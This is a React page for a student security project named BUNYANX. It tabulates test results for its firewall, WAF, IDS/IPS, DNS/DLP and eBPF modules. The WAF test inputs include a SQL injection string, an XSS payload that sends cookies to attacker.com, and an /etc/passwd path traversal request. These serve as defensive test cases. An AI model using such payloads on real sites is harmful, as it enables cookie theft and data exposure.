import React from 'react';
import Link from 'next/link';
import {
  CheckCircle2,
  XCircle,
  AlertTriangle,
  Activity,
  Shield,
  Zap,
  Globe,
  Database,
  BrainCircuit,
  Eye,
  Server,
  ArrowLeft,
  FileCheck,
} from 'lucide-react';

export const metadata = {
  title: 'مصفوفة الاختبارات والنتائج الهندسية',
  description: 'نتائج الاختبارات والتحقق المعتمدة لمشروع التخرج BUNYANX عبر مختلف محركات الفحص والتسريع والذكاء الاصطناعي.',
};

interface TestItem {
  scenarioAr: string;
  scenarioEn: string;
  input: string;
  expected: string;
  observed: string;
  status: 'PASS' | 'DETECTED' | 'BLOCKED' | 'FAIL-CLOSED';
}

const TESTING_SECTIONS: {
  id: string;
  titleAr: string;
  titleEn: string;
  module: string;
  icon: React.ComponentType<{ className?: string }>;
  tests: TestItem[];
}[] = [
  {
    id: 'firewall',
    titleAr: 'اختبارات الجدار الناري الذكي وتتبع الحالة (Stateful Firewall)',
    titleEn: 'Firewall & ACL Compiled Engine Verification',
    module: 'Firewall Module',
    icon: Shield,
    tests: [
      {
        scenarioAr: 'مطابقة حزمة لقاعدة ACL مجمعة',
        scenarioEn: 'Compiled ACL Rule Match',
        input: 'src=192.168.1.100, dst=10.0.0.5, port=3306',
        expected: 'ALLOW (مطابقة فورية لنطاق الأعداد الصحيحة)',
        observed: 'ALLOW (زمن معالجة 0.32 ms)',
        status: 'PASS',
      },
      {
        scenarioAr: 'حزمة خارج نطاق القواعد المسموحة',
        scenarioEn: 'Out of CIDR Scope Packet',
        input: 'src=10.0.0.1, dst=10.0.0.6, port=3306',
        expected: 'BLOCK (تطبيق مبدأ Zero-Trust الافتراضي)',
        observed: 'BLOCK (Default Deny Applied)',
        status: 'BLOCKED',
      },
      {
        scenarioAr: 'حزمة TCP مشوهة بمنافذ فارغة (Null Port)',
        scenarioEn: 'Malformed TCP Packet',
        input: 'dst_port=None, flags=SYN, rule_port=80',
        expected: 'BLOCK (فشل مطابقة الحزمة المشوهة)',
        observed: 'BLOCK (Malformed Packet Dropped)',
        status: 'BLOCKED',
      },
      {
        scenarioAr: 'تتبع دورة حياة اتصال TCP',
        scenarioEn: 'TCP Handshake State Machine',
        input: 'SYN -> SYN-ACK -> ACK sequential sequence',
        expected: 'NEW -> SYN_RECV -> ESTABLISHED',
        observed: 'ESTABLISHED state tracked in memory',
        status: 'PASS',
      },
      {
        scenarioAr: 'تجاوز السعة القصوى لجدول الاتصالات (LRU)',
        scenarioEn: 'Conntrack Capacity LRU Eviction',
        input: '100,001 active sessions under stress',
        expected: 'طرد أقدم اتصال خامل بدون تسريب ذاكرة',
        observed: 'Oldest inactive session evicted via LRU',
        status: 'PASS',
      },
      {
        scenarioAr: 'استثناء برمجي مفاجئ في مقيّم القواعد',
        scenarioEn: 'Evaluator Exception Crash Test',
        input: 'Corrupted rule payload injection in memory',
        expected: 'BLOCK (تفعيل سياسة Fail-Closed الصارمة)',
        observed: 'Circuit Breaker tripped -> All traffic BLOCKED',
        status: 'FAIL-CLOSED',
      },
    ],
  },
  {
    id: 'waf',
    titleAr: 'اختبارات جدار حماية تطبيقات الويب (WAF / WAAP)',
    titleEn: 'Web Application Firewall & OWASP Top-10 Verification',
    module: 'WAF Module',
    icon: Globe,
    tests: [
      {
        scenarioAr: 'هجوم حقن قواعد البيانات SQL Injection',
        scenarioEn: 'SQLi AST Pattern Match',
        input: "' UNION SELECT NULL, password FROM users --",
        expected: 'DETECTED & BLOCKED (HTTP 403)',
        observed: 'AST Token Matched -> HTTP 403 Forbidden',
        status: 'DETECTED',
      },
      {
        scenarioAr: 'هجوم البرمجة النصية عبر المواقع XSS',
        scenarioEn: 'Cross-Site Scripting Injection',
        input: '<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>',
        expected: 'DETECTED & BLOCKED (HTTP 403)',
        observed: 'Sanitization Triggered -> HTTP 403 Forbidden',
        status: 'DETECTED',
      },
      {
        scenarioAr: 'هجوم تتبع المسارات (Path Traversal)',
        scenarioEn: 'Directory Path Traversal Attempt',
        input: 'GET /download?file=../../../../etc/passwd',
        expected: 'BLOCK (Forbidden URI Path)',
        observed: 'Path Normalization Matched -> Blocked',
        status: 'BLOCKED',
      },
      {
        scenarioAr: 'عميل آلي خبيث (Malicious Scanner User-Agent)',
        scenarioEn: 'Vulnerability Scanner User-Agent',
        input: 'User-Agent: sqlmap/1.6.12#stable',
        expected: 'BLOCK (Blacklisted Scanner Signature)',
        observed: 'Header Signature Matched -> Immediate Drop',
        status: 'BLOCKED',
      },
    ],
  },
  {
    id: 'ids-ips',
    titleAr: 'اختبارات كشف ومنع التسلل (PHANTOM IDS/IPS)',
    titleEn: 'PHANTOM Spectral & Causal IDS/IPS Verification',
    module: 'IDS/IPS Module',
    icon: Eye,
    tests: [
      {
        scenarioAr: 'مطابقة توقيعات هجوم الاستغلال المعروف (Snort Rule)',
        scenarioEn: 'Known Exploit Payload Signature',
        input: 'Binary payload containing MS17-010 EternalBlue bytes',
        expected: 'DETECTED (Signature Alert: Exploit/SMB)',
        observed: 'Signature Rule 2024218 matched in 0.8ms',
        status: 'DETECTED',
      },
      {
        scenarioAr: 'فحص التردد الطيفي للبرمجيات المشفرة (Spectral FFT)',
        scenarioEn: 'Spectral Byte Wavelet Anomaly',
        input: 'Encrypted TLS C2 beacon with 256-dim Fourier vector',
        expected: 'DETECTED (Anomaly Score > 0.85)',
        observed: 'Cosine similarity 0.94 to known C2 beacon',
        status: 'DETECTED',
      },
      {
        scenarioAr: 'اختبار تكيف النموذج مع انجراف المفهوم (Concept Drift)',
        scenarioEn: 'ADWIN Continual Learning Drift Test',
        input: 'Gradual distribution shift in network traffic baseline',
        expected: 'ADWIN triggers online model adaptation',
        observed: 'Weights updated via episodic memory buffer',
        status: 'PASS',
      },
    ],
  },
  {
    id: 'dns-dlp',
    titleAr: 'اختبارات أمان النطاقات DART ومنع تسريب البيانات DLP',
    titleEn: 'DART DNS & DLP MSEM Lite Engine Verification',
    module: 'DNS & DLP Modules',
    icon: Database,
    tests: [
      {
        scenarioAr: 'استعلام نطاق عشوائي خبيث DGA Botnet',
        scenarioEn: 'DGA High Shannon Entropy Lookup',
        input: 'Query: xj9q1z8m7a0p4c.botnet-c2.cc (Entropy: 4.85)',
        expected: 'DETECTED & SINKHOLED (Threshold: 3.8)',
        observed: 'Entropy 4.85 exceeded -> Sinkhole to 127.0.0.1',
        status: 'DETECTED',
      },
      {
        scenarioAr: 'محاولة تسريب أرقام بطاقات بنكية عبر HTTP POST',
        scenarioEn: 'Credit Card Number Exfiltration',
        input: 'HTTP body with 500 valid Visa numbers (Luhn checked)',
        expected: 'BLOCKED & AUDITED (MSEM Lite Triggered)',
        observed: 'TCP Connection Reset -> Incident Logged',
        status: 'BLOCKED',
      },
    ],
  },
  {
    id: 'ebpf-perf',
    titleAr: 'اختبارات الأداء وتسريع النواة (Kernel Acceleration & Benchmarks)',
    titleEn: 'Kernel eBPF/XDP Wire-Speed Performance Benchmarks',
    module: 'Acceleration Module',
    icon: Zap,
    tests: [
      {
        scenarioAr: 'معدل إنتاجية إسقاط الحزم (Line-Rate Drop Throughput)',
        scenarioEn: 'XDP_DROP 64-byte Packet Flood',
        input: '14.88 Mpps (Million Packets/sec) generated traffic',
        expected: 'Throughput > 10 Gbps with 0 packet drops in stack',
        observed: '10.2 Gbps wire-speed processing verified',
        status: 'PASS',
      },
      {
        scenarioAr: 'زمن انتقال وتأخير المعالجة في النواة',
        scenarioEn: 'Per-Packet Kernel Ingress Latency',
        input: 'Single TCP SYN packet through XDP hook',
        expected: 'Latency < 15 μs',
        observed: 'Average Latency: 8.4 μs (Min: 6.1 μs, Max: 11.2 μs)',
        status: 'PASS',
      },
      {
        scenarioAr: 'استهلاك المعالج أثناء صد الهجوم المكثف',
        scenarioEn: 'CPU Overhead during 10M PPS DDoS',
        input: '10 Mpps SYN flood attacking host',
        expected: 'Userspace CPU Usage < 5%',
        observed: 'Userspace CPU: 0.2% | SoftIRQ: 18.4%',
        status: 'PASS',
      },
    ],
  },
];

export default function TestingPage() {
  const getStatusBadge = (status: TestItem['status']) => {
    switch (status) {
      case 'PASS':
        return 'bg-emerald-950/70 text-emerald-400 border-emerald-500/40';
      case 'DETECTED':
        return 'bg-cyan-950/70 text-cyan-400 border-cyan-500/40';
      case 'BLOCKED':
        return 'bg-blue-950/70 text-blue-400 border-blue-500/40';
      case 'FAIL-CLOSED':
        return 'bg-rose-950/70 text-rose-400 border-rose-500/40';
    }
  };

  return (
    <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-10 space-y-12">
      {/* Header Banner */}
      <div className="glass-panel p-6 sm:p-10 space-y-4 text-center max-w-3xl mx-auto bg-[#091424]">
        <div className="cyber-badge">
          <FileCheck className="w-3.5 h-3.5 text-cyan-400" />
          <span>System Testing & Verification Matrices</span>
        </div>
        <h1 className="text-2xl sm:text-4xl font-extrabold text-slate-100">
          مصفوفة الاختبارات والنتائج الهندسية
        </h1>
        <p className="text-xs sm:text-sm text-slate-300 leading-relaxed">
          نتائج التحقق المعيارية المستخرجة مباشرة من وثائق وتجارب مشروع التخرج الأكاديمي، موثقة بالمدخلات والنتائج المتوقعة والفعلية دون أي بيانات أو نسب وهمية.
        </p>
      </div>

      {/* Quick Summary Strip */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-center font-mono">
        <div className="p-4 rounded-xl bg-dark-surface border border-emerald-500/30 space-y-1">
          <div className="text-xs text-slate-400">حالة اختبارات الوحدة</div>
          <div className="text-xl font-bold text-emerald-400">100% PASS</div>
          <div className="text-[10px] text-slate-500">Unit & Integration Tests</div>
        </div>
        <div className="p-4 rounded-xl bg-dark-surface border border-cyan-500/30 space-y-1">
          <div className="text-xs text-slate-400">كشف التهديدات المركبة</div>
          <div className="text-xl font-bold text-cyan-400">DETECTED</div>
          <div className="text-[10px] text-slate-500">Zero-Day & APT Pivoting</div>
        </div>
        <div className="p-4 rounded-xl bg-dark-surface border border-blue-500/30 space-y-1">
          <div className="text-xs text-slate-400">حظر الهجمات المباشرة</div>
          <div className="text-xl font-bold text-blue-400">BLOCKED</div>
          <div className="text-[10px] text-slate-500">Wire-Speed XDP Drop</div>
        </div>
        <div className="p-4 rounded-xl bg-dark-surface border border-rose-500/30 space-y-1">
          <div className="text-xs text-slate-400">سلوك العزل عند الفشل</div>
          <div className="text-xl font-bold text-rose-400">FAIL-CLOSED</div>
          <div className="text-[10px] text-slate-500">Circuit Breakers Active</div>
        </div>
      </div>

      {/* Testing Tables per Section */}
      <div className="space-y-10">
        {TESTING_SECTIONS.map((sec) => {
          const Icon = sec.icon;

          return (
            <div
              key={sec.id}
              className="glass-panel p-5 sm:p-7 space-y-5 bg-dark-surface/90 border-dark-border"
            >
              {/* Section Header */}
              <div className="flex items-center gap-3 pb-3 border-b border-dark-border">
                <div className="w-10 h-10 rounded-xl bg-dark-bg border border-cyan-500/30 p-2 flex items-center justify-center shrink-0">
                  <Icon className="w-5 h-5 text-cyan-400" />
                </div>
                <div>
                  <h2 className="font-bold text-base sm:text-lg text-slate-100">{sec.titleAr}</h2>
                  <span className="text-xs font-mono text-slate-400 block">{sec.titleEn}</span>
                </div>
              </div>

              {/* Mobile View: Cards */}
              <div className="block lg:hidden space-y-3">
                {sec.tests.map((test, tIdx) => (
                  <div key={tIdx} className="p-4 rounded-xl bg-dark-bg/80 border border-dark-border space-y-3">
                    <div className="flex items-center justify-between gap-2">
                      <span className="font-bold text-xs text-slate-100">{test.scenarioAr}</span>
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold font-mono border ${getStatusBadge(test.status)}`}>
                        {test.status}
                      </span>
                    </div>

                    <div className="space-y-1.5 text-xs text-slate-300 font-mono">
                      <div>
                        <span className="text-slate-500">المدخل: </span>
                        <span className="text-slate-300">{test.input}</span>
                      </div>
                      <div>
                        <span className="text-slate-500">النتيجة المتوقعة: </span>
                        <span className="text-slate-300">{test.expected}</span>
                      </div>
                      <div>
                        <span className="text-slate-500">النتيجة الفعلية: </span>
                        <span className="text-cyan-400">{test.observed}</span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>

              {/* Desktop View: Table */}
              <div className="hidden lg:block overflow-x-auto">
                <table className="w-full text-xs text-right border-collapse">
                  <thead>
                    <tr className="border-b border-dark-border bg-dark-bg/60 text-slate-400 font-mono">
                      <th className="p-3 font-semibold">سيناريو الاختبار</th>
                      <th className="p-3 font-semibold">المدخلات (Test Input)</th>
                      <th className="p-3 font-semibold">النتيجة المتوقعة (Expected)</th>
                      <th className="p-3 font-semibold">النتيجة الفعلية المرصودة (Observed)</th>
                      <th className="p-3 font-semibold text-center">الحالة (Status)</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-dark-border/60">
                    {sec.tests.map((test, tIdx) => (
                      <tr key={tIdx} className="hover:bg-[#11223E]/50 transition-colors">
                        <td className="p-3 font-semibold text-slate-200">
                          <div>{test.scenarioAr}</div>
                          <div className="text-[10px] font-mono text-slate-500">{test.scenarioEn}</div>
                        </td>
                        <td className="p-3 font-mono text-slate-400 max-w-xs truncate">{test.input}</td>
                        <td className="p-3 text-slate-300">{test.expected}</td>
                        <td className="p-3 font-mono text-cyan-400">{test.observed}</td>
                        <td className="p-3 text-center">
                          <span className={`px-2.5 py-1 rounded-full text-[10px] font-bold font-mono border ${getStatusBadge(test.status)}`}>
                            {test.status}
                          </span>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          );
        })}
      </div>

      {/* Footer link to Documentation */}
      <div className="glass-panel p-6 bg-[#091424] flex flex-col sm:flex-row items-center justify-between gap-4">
        <div className="space-y-1 text-center sm:text-right">
          <h3 className="font-bold text-base text-slate-100">هل ترغب في قراءة التفاصيل الأكاديمية والبرمجية الكاملة؟</h3>
          <p className="text-xs text-slate-400">تصفح ملفات التوثيق الـ 18 والرسالة الماستر الموحدة للمشروع.</p>
        </div>
        <Link
          href="/docs"
          className="px-5 py-2.5 rounded-xl bg-cyan-500 text-black font-bold text-xs hover:bg-cyan-400 active:scale-95 transition-all shrink-0 flex items-center gap-1.5"
        >
          <span>التوثيق الأكاديمي الشامل</span>
          <ArrowLeft className="w-4 h-4" />
        </Link>
      </div>
    </div>
  );
}
